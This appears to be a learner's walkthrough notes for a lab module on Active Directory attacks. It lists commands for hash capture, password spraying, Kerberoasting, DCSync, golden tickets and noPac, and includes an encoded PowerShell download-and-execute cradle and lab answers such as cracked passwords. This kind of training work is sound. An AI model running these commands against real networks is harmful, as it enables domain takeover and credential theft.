# Active Directory Enumeration & Attacks 

# External Recon and Enumeration Principles

```bash

# search domains
https://bgp.he.net/dns/inlanefreight.com 

https://dnsdumpster.com/

https://viewdns.info/

https://whois.domaintools.com/


# google
filetype:pdf inurl:inlanefreight.com

intext:"@inlanefreight.com" inurl:inlanefreight.com

# Dehashed is an excellent tool for hunting for cleartext credentials and password hashes in breach data

```



# Initial Enumeration of the Domain

```bash

sudo tcpdump -i ens224 

sudo responder -I ens224 -A 

fping -asgq 172.16.5.0/23



```

# LLMNR/NBT-NS Poisoning - from Linux


Run Responder and obtain a hash for a user account that starts with the letter b. Submit the account name as your answer. 

```bash

sudo responder -I ens224 

```

Crack the hash for the previous account and submit the cleartext password as your answer. 

```bash

hashcat -m 5600 hash_backupagent /usr/share/wordlists/rockyou.txt 

```

Run Responder and obtain an NTLMv2 hash for the user wley. Crack the hash using Hashcat and submit the user's password as your answer. 

```bash
hashcat -m 5600 hash_wley /usr/share/wordlists/rockyou.txt  

```

# LLMNR/NBT-NS Poisoning - from Windows

 Run Inveigh and capture the NTLMv2 hash for the svc_qualys account. Crack and submit the cleartext password as the answer. 

```powershell

Import-Module .\Inveigh.ps1
(Get-Command Invoke-Inveigh).Parameters

Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y

.\Inveigh.exe


```

# Enumerating & Retrieving Password Policies

What is the default Minimum password length when a new domain is created? (One number) 

```bash

crackmapexec smb 172.16.5.5 -u user -p Password --pass-pol

```


What is the minPwdLength set to in the INLANEFREIGHT.LOCAL domain? (One number) 

```bash
enum4linux -P 172.16.5.5

enum4linux-ng -P 172.16.5.5 -oA ilfreight

```

# Password Spraying - Making a Target User List

Enumerate valid usernames using Kerbrute and the wordlist located at /opt/jsmith.txt on the ATTACK01 host. How many valid usernames can we enumerate with just this wordlist from an unauthenticated standpoint?

```bash

kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 

```

# Internal Password Spraying - from Linux

Find the user account starting with the letter "s" that has the password Welcome1. Submit the username as your answer. 

```bash

enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]" > valid_users.txt

kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1 

```

# Internal Password Spraying - from Windows

Using the examples shown in this section, find a user with the password Winter2022. Submit the username as the answer. 

```powershell

Import-Module .\DomainPasswordSpray.ps1

Invoke-DomainPasswordSpray -Password <Winter2022> -OutFile spray_success -ErrorAction SilentlyContinue

```

# Credentialed Enumeration - from Linux

What AD User has a RID equal to Decimal 1170? 
```bash
rpcclient -U "" -N 172.16.5.5
 enumdomusers
 queryuser 0x492

```

 What is the membercount: of the "Interns" group? 

 ```bash
missing
 ```


# Credentialed Enumeration - from Windows

Using Bloodhound, determine how many Kerberoastable accounts exist within the INLANEFREIGHT domain. (Submit the number as the answer) 

```powershell
 
 Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

```

What PowerView function allows us to test if a user has administrative access to a local or remote host? 

```powershell

```
Run Snaffler and hunt for a readable web config file. What is the name of the user in the connection string within the file? 
What is the password for the database user? 

```powershell

.\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data

```

# Living Off the Land


Enumerate the host's security configuration information and provide its AMProductVersion. 

```powershell

Get-NetFirewallProfile | Select-Object Name, Enabled

```
What domain user is explicitly listed as a member of the local Administrators group on the target host? 

```powershell

 net localgroup Administrators

```

Utilizing techniques learned in this section, find the flag hidden in the description field of a disabled account with administrative privileges. Submit the flag as the answer. 

```powershel

Get-ADUser -Filter { Enabled -eq $false } -Properties MemberOf, Description


hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 

```

# Kerberoasting - from Windows

Crack the password for this account and submit it as your answer. 
What is the name of the service account with the SPN 'vmware/inlanefreight.local'? 

```powershell
    
setspn.exe -Q */*

Import-Module .\PowerView.ps1

Get-DomainUser * -spn | select samaccountname

Get-DomainUser -Identity svc_vmwaresso | Get-DomainSPNTicket -Format Hashcat

hashcat -m 13100 svc_hash /usr/share/wordlists/rockyou.txt

```

# Access Control List (ACL) Abuse Primer
# ACL Enumeration

What is the rights GUID for User-Force-Change-Password?

What flag can we use with PowerView to show us the ObjectAceType in a human-readable format during our enumeration? 

What privileges does the user damundsen have over the Help Desk Level 1 group? 

```powershell
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid wley
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

```

Using the skills learned in this section, enumerate the ActiveDirectoryRights that the user forend has over the user dpayne (Dagmar Payne). 


```powershell
PS C:\Tools> Import-Module ActiveDirectory
>>
PS C:\Tools> $targetUser = Get-ADUser -Identity dpayne -Properties DistinguishedName
PS C:\Tools> $targetUserDN = $targetUser.DistinguishedName
PS C:\Tools> $acl = Get-Acl -Path "AD:$($targetUserDN)"
PS C:\Tools> $forendRights = $acl.Access | Where-Object { $_.IdentityReference -eq 'INLANEFREIGHT\forend' }
PS C:\Tools> $forendRights | Select-Object IdentityReference, ActiveDirectoryRights, AccessControlType
```

What is the ObjectAceType of the first right that the forend user has over the GPO Management group? (two words in the format Word-Word)


# ACL Abuse Tactics

Work through the examples in this section to gain a better understanding of ACL abuse and performing these skills hands-on. Set a fake SPN for the adunn account, Kerberoast the user, and crack the hash using Hashcat. Submit the account's cleartext password as your answer. 

```powershell
# Creating a PSCredential Object
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)

# Creating a SecureString Object
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

# Changing the User's Password
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

# Creating a SecureString Object using damundsen
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 

# Adding damundsen to the Help Desk Level 1 Group

Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members

Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose


# Confirming damundsen was Added to the Group
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName

# Creating a Fake SPN
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

.\Rubeus.exe kerberoast /user:adunn /nowrap

##...SyncMaster757

```

# DCSync

 Perform a DCSync attack and look for another user with the option "Store password using reversible encryption" set. Submit the username as your answer. 


```powershell 

Import-Module .\PowerView.ps1

Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl

Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl

```
Perform a DCSync attack and submit the NTLM hash for the khartsfield user as your answer. 
What is this user's cleartext password? 

```bash

runas /netonly /user:INLANEFREIGHT\adunn powershell

.\mimikatz.exe



 lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\khartsfield

  lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\syncron
```

# Privileged Access

What other user in the domain has CanPSRemote rights to a host? 
```powershell

```
What host can this user access via WinRM? (just the computer name) 

```powershell

```

Leverage SQLAdmin rights to authenticate to the ACADEMY-EA-DB01 host (172.16.5.150). Submit the contents of the flag at C:\Users\damundsen\Desktop\flag.txt. 

```powershell

```


# Bleeding Edge Vulnerabilities

Which two CVEs indicate NoPac.py may work? (Format: ####-#####&####-#####, no spaces) 

2021-42278&2021-42287

Apply what was taught in this section to gain a shell on DC01. Submit the contents of flag.txt located in the DailyTasks directory on the Administrator's desktop. 

```bash
 git clone https://github.com/SecureAuthCorp/impacket.git
 python setup.py install 

git clone https://github.com/Ridter/noPac.git

sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap

sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```


# Miscellaneous Misconfigurations

Find another user with the passwd_notreqd field set. Submit the samaccountname as your answer. The samaccountname starts with the letter "y". 

```powershell

Import-Module .\PowerView.ps1
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

```

Find another user with the "Do not require Kerberos pre-authentication setting" enabled. Perform an ASREPRoasting attack against this user, crack the hash, and submit their cleartext password as your answer. 

```bash

.\Rubeus.exe asreproast /user:ygroce /nowrap /format:hashcat

hashcat -m 18200 ygorce_hash /usr/share/wordlists/rockyou.txt 

```
# Domain Trusts Primer

What is the child domain of INLANEFREIGHT.LOCAL? (format: FQDN, i.e., DEV.ACME.LOCAL) 

```powershell
 Import-Module activedirectory

 Get-ADTrust -Filter *

        

 Get-DomainTrust
 Get-DomainTrustMapping

```

What domain does the INLANEFREIGHT.LOCAL domain have a forest 
transitive trust with? 

```powershell

Get-DomainTrust

```


What direction is this trust? 

```powershell

Import-Module activedirectory

 Get-ADTrust -Filter *
```

# Attacking Domain Trusts - Child -> Parent Trusts - from Windows

What is the SID of the child domain? 

```powershell
Import-Module .\PowerView.ps1
 Get-DomainSID

```
What is the SID of the Enterprise Admins group in the root domain? 

```powershell
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

```
 
Perform the ExtraSids attack to compromise the parent domain. Submit the contents of the flag.txt file located in the c:\ExtraSids folder on the ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL domain controller in the parent domain.

    The KRBTGT hash for the child domain: 9d765b482771505cbe97411065964d5f
    The SID for the child domain: S-1-5-21-2806153819-209893948-922872689
    The name of a target user in the child domain (does not need to exist to create our Golden Ticket!): We'll choose a fake user: hacker
    The FQDN of the child domain: LOGISTICS.INLANEFREIGHT.LOCAL
    The SID of the Enterprise Admins group of the root domain: S-1-5-21-3842939050-3880317879-2865463114-519

```powershell

mimikatz.exe
 privilege::debug
 lsadump::dcsync /user:LOGISTICS\krbtgt

 kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt


klist
ls \\academy-ea-dc01.inlanefreight.local\c$
type \\academy-ea-dc01.inlanefreight.local\c$\ExtraSids\flag.txt
```

# Attacking Domain Trusts - Child -> Parent Trusts - from Linux

Perform the ExtraSids attack to compromise the parent domain from the Linux attack host. After compromising the parent domain obtain the NTLM hash for the Domain Admin user bross. Submit this hash as your answer. 

```bash
# Get the necessary information to create a golden ticket
python3 /opt/impacket/examples/secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
#password:HTB_@cademy_stdnt_admin!

python3 /opt/impacket/examples/lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"

python3 /opt/impacket/examples/lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"

# Constructing a Golden Ticket using ticketer.py
python3 /opt/impacket/examples/ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker

export KRB5CCNAME=hacker.ccache 

# Getting a SYSTEM shell using Impacket's psexec.py
python /opt/impacket/examples/psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5

Invoke-WebRequest -Uri "http://172.16.5.225:8000/mimikatz.exe" -OutFile "C:\Users\Administrator\mimikatz.exe"
python3 -m http.server 8000

mimikatz.exe
 privilege::debug
 lsadump::lsa /patch

```

# Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows

Perform a cross-forest Kerberoast attack and obtain the TGS for the mssqlsvc user. Crack the ticket and submit the account's cleartext password as your answer. 

```powershell
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName

Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof

.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap

hashcat -m 13100 mssqlsvc_hash /usr/share/wordlists/rockyou.txt
#mssqlsvc:1logistics




```
python3 C:\Users\Administrator\GetUserSPNs.py 

# Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux


Kerberoast across the forest trust from the Linux attack host. Submit the name of another account with an SPN aside from MSSQLsvc. 

```bash
python3 /opt/impacket/examples/GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
#wley:transporter@4

```

Crack the TGS and submit the cleartext password as your answer. 

```bash
python3 /opt/impacket/examples/GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
hashcat -m 13100 sapsso_hash /usr/share/wordlists/rockyou.txt
#sapsso:pabloPICASSO

```
Log in to the ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL Domain Controller using the Domain Admin account password submitted for question #2 and submit the contents of the flag.txt file on the Administrator desktop.

```bash

python3 /opt/impacket/examples/wmiexec.py FREIGHTLOGISTICS.LOCAL/sapsso:pabloPICASSO@ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL

```

# Additional AD Auditing Techniques

Take some time to experiment with the tools from this section with the spawned target. When done, enter COMPLETE as the answer to this question. 

```powershell


```


Invoke-WebRequest -Uri "http://10.10.16.51:8000/PowerView.ps1" -OutFile "C:\Windows\system32\PowerView.ps1"


# skill assessment 1

Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer 

```bash
# on shell
Invoke-WebRequest -Uri "http://10.10.16.51:8000/PowerView.ps1" -OutFile "C:\Windows\system32\PowerView.ps1" # send file to linux with powershell


msfconsole 
  search web_delivery
  set payload windows/x64/meterpreter/reverse_tcp
  set target 2
  migrate <Pid_winlogon.exe>

  meterpreter> shell
              powershell
              Import-Module .\PowerView.ps1
              GET-Domainuser * -spn

```

Crack the account's password. Submit the cleartext value. 

```powershell

GET-Domainuser -Identity svc_sql | GET-DomainSPNTicket -Format Hashcat


hashcat -m 13100 hash_svc_sql  /usr/share/wordlists/rockyou.txt

#svc_sql:lucky7

```

Submit the contents of the flag.txt file on the Administrator desktop on MS01 

```msfconsole

  meterpreter> run autoroute -s 172.16.6.0/24
  meterpreter> bg
  use auxiliary/scanner/portscan/tcp
   set rhosts 172.16.6.0/24
   set PORTS 139,445
   set threads 50

  use auxiliary/server/socks_proxy

  sudo nano /etc/proxychains4.conf
  socks5          127.0.0.1 1080


  sudo proxychains crackmapexec smb 172.16.6.50 -u svc_sql -p lucky7 --lsa

  proxychains /usr/share/doc/python3-impacket/examples/secretsdump.py INLANEFREIGHT/tpetty@172.16.6.3 -just-dc-user administrator

  proxychains /usr/share/doc/python3-impacket/examples/wmiexec.py administrator@172.16.6.3 -hashes aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0

  proxychains xfreerdp /v:172.16.6.50  /u:svc_sql /p:lucky7              

```

Find cleartext credentials for another domain user. Submit the username as your answer. 

Submit this user's cleartext password. 

What attack can this user perform? 

Take over the domain and submit the contents of the flag.txt file on the Administrator Desktop on DC01 

# skill assessment 2

Obtain a password hash for a domain user account that can be leveraged to gain a foothold in the domain. What is the account name? 

What is this user's cleartext password? 


Submit the contents of the C:\flag.txt file on MS01. 


What is this user's password? 

Locate a configuration file containing an MSSQL connection string. What is the password for the user listed in this file? 

Submit the contents of the flag.txt file on the Administrator Desktop on the SQL01 host. 

Submit the contents of the flag.txt file on the Administrator Desktop on the MS01 host. 

Obtain credentials for a user who has GenericAll rights over the Domain Admins group. What's this user's account name? 

Crack this user's password hash and submit the cleartext password as your answer. 

Submit the contents of the flag.txt file on the Administrator desktop on the DC01 host. 

Submit the NTLM hash for the KRBTGT account for the target domain after achieving domain compromise. 



```bash
sudo responder -I ens224 -v

hashcat -m 13100 hash_AB920  /usr/share/wordlists/rockyou.txt 
#AB920:weasal

fping -asgq 172.16.7.0/23
#172.16.7.3
#172.16.7.50
#172.16.7.60
/user:inlanefreight\BR086
crackmapexec smb 172.16.7.3 -u AB920 -p weasal --groups
#Administrators                           membercount: 3
#Users                                    membercount: 3
#Guests                                   membercount: 2

xfreerdp /u:AB920 /p:weasal /v:172.16.7.50 /drive:share,/home/htb-student  /size:70%

```

Use a common method to obtain weak credentials for another user. Submit the username for the user whose credentials you obtain. 

```bash
#Download the file
git clone  https://github.com/ropnop/kerbrute.git
scp -r kerbrute htb-student@10.129.56.66:/home/htb-student/
  cd kerbrute
  sudo make all


ssh -D 9050 htb-student@10.129.56.66

proxychains xfreerdp /v:172.16.7.50  /u:AB920 /p:weasal 
# copy and paste the files directily to the machine : Inveigh.ps1 kerbrute PowerView.ps1  PrintSpoofer64.exe  Snaffler.exe

#powershell
  Import-Module .\PowerViewer.ps1
  Import-Module .\Inveigh.ps1

#get the users only names
Get-Domainuser * | select-object  -ExpandProperty samaccountname | Foreach {$_.TrimEnd()} | Set-Content users.txt

.\kerbrute_windows_amd64.exe passwordspray -d inlanefreight.local --dc 172.16.7.3 users.txt Welcome1   

#  VALID LOGIN:  BR086@inlanefreight.local:Welcome1

runas /netonly /user:inlanefreight\BR086 powershell

.\Snaffler.exe -d inlanefreight.local -s -v data
#netdb:D@ta_bAse_adm1n!"

# connect to a database in your computer
proxychains /usr/share/doc/python3-impacket/examples/mssqlclient.py netdb:'D@ta_bAse_adm1n!'\@172.16.7.60
 SQL (netdb  dbo@master)> enable_xp_cmdshell
                        > xp_cmdshell whoami /priv

# SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
                        > xp_cmdshell certutil -urlcache -split -f "http:\\172.16.7.240:8989/PrintSpoofer64.exe" C:\Windows\temp\PrintSpoofer64.exe
                        > xp_cmdshell C:\Windows\temp\PrintSpoofer64.exe -c "net user administrator Welcome1"

proxychains smbclient -U "Administrator" \\\\172.16.7.60\\C$

# on the ssh connect set a web_delivery

# on sql connection
        SQL (netdb  dbo@master)>xp_cmdshell C:\Windows\temp\PrintSpoofer64.exe -c "powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABwADIAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAcAAyAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAcAAyAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA3ADIALgAxADYALgA3AC4AMgA0ADAAOgA4ADAAOAAwAC8AYgByAG4ASgBCAG8AagBNAEcANQBzAHMAawB4AFAALwBCAGwAQQBMAEUAYgBWAG4AbABLACcAKQApADsASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADcALgAyADQAMAA6ADgAMAA4ADAALwBiAHIAbgBKAEIAbwBqAE0ARwA1AHMAcwBrAHgAUAAnACkAKQA7AA=="

# on ssh connection 
 sudo crackmapexec smb 172.16.7.60 -u administrator -p Welcome1 --local-auth --lsa 

 #INLANEFREIGHT\mssqlsvc:Sup3rS3cur3maY5ql$3rverE

# enter in 172.16.7.50 on powershell with this cred: mssqlsvc:Sup3rS3cur3maY5ql$3rverE

 Import-Module .\Inveigh.ps1
 Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
 
 
hashcat -m 5600 hash_CT059  /usr/share/wordlists/rockyou.txt 
#CT059:charlie1
  
  # see the permisson the user
  $sid = Convert-NameToSid CT059
  Get-DomainObjectACL -Identity 'Domain Admins' | ?{$_.SecurityIdentifer -eq $sid} 

  # this user shell run in the same powershell will spaw another shell
  runas /netonly /user:inlamefreight\CT059 powershell
  
  # add the user to domain controller
  net user administrator Welcome1 /domain

  #access to domains controler
  proxychains /usr/share/doc/python3-impacket/examples/wmiexec.py administrator@172.16.7.3 

  #on ssh connection to get the hash of krbtgt
  secretsdump.py -outputfile inlanefreight_hashes -just-dc-user krbtgt INLANEFREIGHT/administrator@172.16.7.3

   

```

